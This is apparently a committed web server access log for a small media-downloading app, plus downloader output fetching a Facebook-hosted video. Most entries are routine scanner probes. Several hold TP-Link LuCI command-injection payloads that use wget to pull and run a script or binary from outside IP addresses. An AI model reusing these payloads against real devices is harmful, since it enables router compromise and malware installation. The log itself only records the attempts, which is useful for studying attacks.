+127.0.0.1 - - [15/May/2024 22:59:42] "GET /.git/config HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 23:00:10] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 23:00:11] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 23:00:13] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 23:00:13] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 23:09:41] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 23:09:44] "GET /live/stream_f1.m3u8 HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 23:25:24] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 23:25:24] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [15/May/2024 23:37:52] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 23:37:54] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [15/May/2024 23:44:03] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 23:46:34] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 23:55:44] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 23:55:44] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [15/May/2024 23:58:18] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 00:39:38] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 00:41:56] "GET /portal/redlion HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 00:51:48] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 01:13:15] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:17:53] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 01:28:49] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 01:28:49] "GET //wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:49] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 01:28:49] "GET //blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:49] "GET //web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:50] "GET //wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:50] "GET //website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:50] "GET //wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:50] "GET //news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:50] "GET //2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:50] "GET //2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:50] "GET //shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:50] "GET //wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:50] "GET //test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:51] "GET //wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:51] "GET //site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:51] "GET //cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:28:51] "GET //sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:32:15] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 01:40:50] "GET /ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:40:50] "GET /ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 01:53:02] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 02:32:19] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 02:41:32] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 02:41:36] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 02:41:37] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 02:58:06] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 02:58:20] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 03:07:07] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 03:08:08] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 03:27:55] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+172.105.128.13 - - [16/May/2024 03:33:58] code 400, message Bad request version ('À\x14À')
+172.105.128.13 - - [16/May/2024 03:33:58] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x11&ö¿ïdwVºÔGb¹Û.°\x12YX°/1ÒwÝ\x099÷ØLûë\x00\x00 À/À0À+À,Ì¨Ì©À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [16/May/2024 03:36:55] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 03:36:55] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [16/May/2024 03:40:56] "POST /wp-json/wp/v2/users HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 03:55:51] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 03:58:07] "GET / HTTP/1.0" 200 -
+45.79.115.117 - - [16/May/2024 04:02:48] "GET / HTTP/1.1" 200 -
+172.104.11.51 - - [16/May/2024 04:03:04] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/May/2024 04:06:57] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 04:06:58] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 04:06:58] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 04:06:58] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 04:14:43] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 04:19:37] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+198.235.24.3 - - [16/May/2024 04:26:45] code 400, message Bad request version ('À\x13À')
+198.235.24.3 - - [16/May/2024 04:26:45] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¾7\x91\x9fzVíô_z9×eÀ\x06a\x13\x88î-yÒ\x17ûïÅ"\x82þË[\x9b Q¹à]´K\x7fj½¥\x9d\x10]NZYdÓ^®Ô?msÝä\x96\x1bd8¼²\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+198.235.24.3 - - [16/May/2024 04:26:46] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.3 - - [16/May/2024 04:26:46] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03¿§Ù\x1ds!ÝØ»\x19ëñc4\x0fÀ\x058LÏ\x97p'\x1e\x8b\x03?§¹ÇÒN\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [16/May/2024 04:28:26] "GET /live/stream_f1.m3u8 HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 04:41:05] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 04:41:05] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [16/May/2024 04:41:06] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 04:41:07] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [16/May/2024 04:55:01] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 04:55:02] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [16/May/2024 05:53:02] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:06:01] "GET /live/stream_f1.m3u8 HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:11:19] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:11:19] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:14:54] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 06:22:13] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 06:36:26] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 06:36:27] "GET /wordpress HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:36:29] "GET /wp HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:36:32] "GET /new HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:36:33] "GET /old HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:36:36] "GET /blog HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:36:39] "GET /test HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:36:42] "GET /shop HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:37:39] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;+rm+-rf+shk;+wget+http://14.225.204.172/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk) HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 06:39:18] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 06:40:50] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 07:11:51] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 07:11:51] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 07:11:51] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 07:11:51] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 07:11:51] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 07:11:51] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 07:11:51] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 07:11:51] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 07:11:51] "GET /app-ads.txt HTTP/1.0" 404 -
+216.218.206.68 - - [16/May/2024 07:15:57] code 400, message Bad request version ('\x9e×®à\x1aR\x8a\x9d')
+216.218.206.68 - - [16/May/2024 07:15:57] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03u\x91\x85¶·Q»ä¾\x86nT,\x08\x1f\x9e×®à\x1aR\x8a\x9d" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [16/May/2024 07:35:59] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 07:35:59] "POST / HTTP/1.0" 405 -
+107.170.246.40 - - [16/May/2024 07:42:32] "GET /v2/ HTTP/1.1" 404 -
+127.0.0.1 - - [16/May/2024 07:47:31] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 07:55:51] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 07:56:25] "GET /live/stream_f1.m3u8 HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 07:57:32] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 07:59:28] "GET /webui/ HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 08:00:45] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 08:01:41] "GET /geoserver/web/ HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 08:12:36] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 08:45:11] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 08:45:29] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 08:45:30] "GET /robots.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 08:45:30] "GET /sitemap.xml HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 08:47:03] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 08:47:05] "GET /feed/ HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 08:47:05] "GET /?feed=rss2 HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 08:52:59] "HEAD / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 08:56:20] "GET /wp-content/plugins/litespeed-cache/readme.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 09:07:46] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 09:08:35] "GET /robots.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 09:22:22] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 09:29:47] "GET /live/stream_f1.m3u8 HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 09:30:11] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 09:31:22] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 09:42:36] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 09:46:38] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 09:54:18] "GET / HTTP/1.0" 200 -
+104.199.31.214 - - [16/May/2024 09:54:23] code 400, message Bad request version ('\x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
+104.199.31.214 - - [16/May/2024 09:54:23] "\x01\x00\x00ýÎú\x0b° \x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00ðððð\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:28] code 400, message Bad request version ('GetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00')
+104.199.31.214 - - [16/May/2024 09:54:28] "\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x0cGetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:28] "GET / HTTP/1.0" 200 -
+104.199.31.214 - - [16/May/2024 09:54:29] "OPTIONS / HTTP/1.0" 200 -
+104.199.31.214 - - [16/May/2024 09:54:29] code 400, message Bad request version ('RTSP/1.0')
+104.199.31.214 - - [16/May/2024 09:54:29] "OPTIONS / RTSP/1.0" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:34] code 400, message Bad request version ('\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+104.199.31.214 - - [16/May/2024 09:54:34] "\x80\x00\x00(rþ\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86 \x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:39] code 400, message Bad HTTP/0.9 request type ('\x00')
+104.199.31.214 - - [16/May/2024 09:54:39] "\x00\x1e\x00\x06\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:44] code 400, message Bad HTTP/0.9 request type ('\x00')
+104.199.31.214 - - [16/May/2024 09:54:44] "\x00\x0c\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:44] code 400, message Bad request syntax ('HELP')
+104.199.31.214 - - [16/May/2024 09:54:44] "HELP" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:44] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00')
+104.199.31.214 - - [16/May/2024 09:54:44] "\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:45] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+104.199.31.214 - - [16/May/2024 09:54:45] "\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie: mstshash=nmap" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:45] code 400, message Bad request version ('\x00/\x00')
+104.199.31.214 - - [16/May/2024 09:54:45] "\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1c§ärandom1random2random3random4\x00\x00\x0c\x00/\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:45] code 400, message Bad request syntax ('\x00\x00\x00qj\x81n0\x81k¡\x03\x02\x01\x05¢\x03\x02\x01')
+104.199.31.214 - - [16/May/2024 09:54:45] "\x00\x00\x00qj\x81n0\x81k¡\x03\x02\x01\x05¢\x03\x02\x01" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:50] code 400, message Bad request version ('0.12\x00')
+104.199.31.214 - - [16/May/2024 09:54:50] "\x00\x00\x00¤ÿSMBr\x00\x00\x00\x00\x08\x01@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x06\x00\x00\x01\x00\x00\x81\x00\x02PC NETWORK PROGRAM 1.0\x00\x02MICROSOFT NETWORKS 1.03\x00\x02MICROSOFT NETWORKS 3.0\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02Samba\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:55] code 400, message Bad HTTP/0.9 request type ('l\x00')
+104.199.31.214 - - [16/May/2024 09:54:55] "l\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:55] "GET /nice%20ports,/Trinity.txt.bak HTTP/1.0" 404 -
+104.199.31.214 - - [16/May/2024 09:54:55] code 400, message Bad request syntax ('\x01default')
+104.199.31.214 - - [16/May/2024 09:54:55] "\x01default" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:54:56] code 400, message Bad request syntax ('0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00')
+104.199.31.214 - - [16/May/2024 09:54:56] "0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:55:01] code 400, message Bad HTTP/0.9 request type ('0')
+104.199.31.214 - - [16/May/2024 09:55:01] "0\x0c\x02\x01\x01`\x07\x02\x01\x02\x04\x00\x80\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:55:01] code 400, message Bad request version ('SIP/2.0')
+104.199.31.214 - - [16/May/2024 09:55:01] "OPTIONS sip:nm SIP/2.0" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:55:06] code 400, message Bad request syntax ('TNMP\x04\x00\x00\x00TNME\x00\x00\x04\x00')
+104.199.31.214 - - [16/May/2024 09:55:06] "TNMP\x04\x00\x00\x00TNME\x00\x00\x04\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:55:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00')
+104.199.31.214 - - [16/May/2024 09:55:11] "\x03\x00\x00\x0b\x06à\x00\x00\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:55:16] code 400, message Bad request syntax ('DmdT\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x11\x11\x00ÿ\x01ÿ\x13')
+104.199.31.214 - - [16/May/2024 09:55:16] "DmdT\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x11\x11\x00ÿ\x01ÿ\x13" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:55:21] code 400, message Bad HTTP/0.9 request type (':\x00\x00\x00/\x00\x00\x00\x02\x00\x00@\x02\x0f\x00\x01\x00=\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\x00\x00@')
+104.199.31.214 - - [16/May/2024 09:55:21] ":\x00\x00\x00/\x00\x00\x00\x02\x00\x00@\x02\x0f\x00\x01\x00=\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:55:27] code 400, message Bad request syntax ('JRMI\x00\x02K')
+104.199.31.214 - - [16/May/2024 09:55:27] "JRMI\x00\x02K" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:55:32] code 400, message Bad HTTP/0.9 request type ('\x00Z\x00\x00\x01\x00\x00\x00\x016\x01,\x00\x00\x08\x00\x7fÿ\x7f\x08\x00\x00\x00\x01\x00')
+104.199.31.214 - - [16/May/2024 09:55:32] "\x00Z\x00\x00\x01\x00\x00\x00\x016\x01,\x00\x00\x08\x00\x7fÿ\x7f\x08\x00\x00\x00\x01\x00 \x00:\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004æ\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00(CONNECT_DATA=(COMMAND=version))" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:55:37] code 400, message Bad request version ('\x03\x00(\x00\x04ÿ\x08\x00\x01U\x00\x00\x00MSSQLServer\x00H\x0f\x00\x00')
+104.199.31.214 - - [16/May/2024 09:55:37] "\x12\x01\x004\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1b\x00\x01\x02\x00\x1c\x00\x0c\x03\x00(\x00\x04ÿ\x08\x00\x01U\x00\x00\x00MSSQLServer\x00H\x0f\x00\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:55:42] code 400, message Bad request syntax ('\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x0f\x00')
+104.199.31.214 - - [16/May/2024 09:55:42] "\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x0f\x00" HTTPStatus.BAD_REQUEST -
+104.199.31.214 - - [16/May/2024 09:55:47] code 400, message Bad request syntax ('GIOP\x01\x00\x01\x00$\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00abcdef\x00\x00\x04\x00\x00\x00get\x00\x00\x00\x00\x00')
+104.199.31.214 - - [16/May/2024 09:55:47] "GIOP\x01\x00\x01\x00$\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00abcdef\x00\x00\x04\x00\x00\x00get\x00\x00\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [16/May/2024 09:55:47] "GET /nmaplowercheck1715853347 HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 09:55:47] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 09:55:47] "POST /sdk HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 09:55:47] "GET /HNAP1 HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 09:55:47] "GET /evox/about HTTP/1.0" 404 -
+104.199.31.214 - - [16/May/2024 09:55:47] code 400, message Bad request syntax ('\x80\x00\x00(\x19\x17ã')
+104.199.31.214 - - [16/May/2024 09:55:47] "\x80\x00\x00(\x19\x17ã" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [16/May/2024 09:55:47] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 09:55:48] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 09:59:52] "GET /robots.txt HTTP/1.0" 404 -
+127.0.0.1 - - [16/May/2024 10:00:00] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:11:59] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/May/2024 10:15:45] "GET /series.json HTTP/1.0" 200 -
+[generic] Extracting URL: https://scontent-sea1-1.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n...WNkT0qog&oe=664AD983
+[generic] 10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30=&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1: Downloading webpage
+[redirect] Following redirect to https://video.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30%3D&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1.xx&oh=00_AYB8djH-CBjo2WxeqGvI_vUM7bDuTZCHAfkjm8WNkT0qog&oe=664AD983
+[generic] Extracting URL: https://video.xx.fbcdn.net/v/t42.1790-2/10000000_1204294653891443_5795129656153610659_n.mp4?_nc_c...WNkT0qog&oe=664AD983
+[generic] 10000000_1204294653891443_5795129656153610659_n.mp4?_nc_cat=104&ccb=1-7&_nc_sid=55d0d3&efg=eyJ2ZW5jb2RlX3RhZyI6InN2ZV9zZCIsInZpZGVvX2lkIjoyNTQ1NzIyNTMzMDU5MjUyM30=&_nc_eui2=AeEEqk_vPjWSayU1yfOXCq8sPsGrFNjNwSY-wasU2M3BJml6Of_ixSlgIb8tSYoFgH0ONHIkOyFz3L2IuZZcL3xu&_nc_ohc=G6H4mPQAuyIQ7kNvgEP3VHO&_nc_rml=0&_nc_ht=scontent-sea1-1: Downloading webpage
+127.0.0.1 - - [16/May/2024 10:15:50] "POST /get_media HTTP/1.0" 200 -
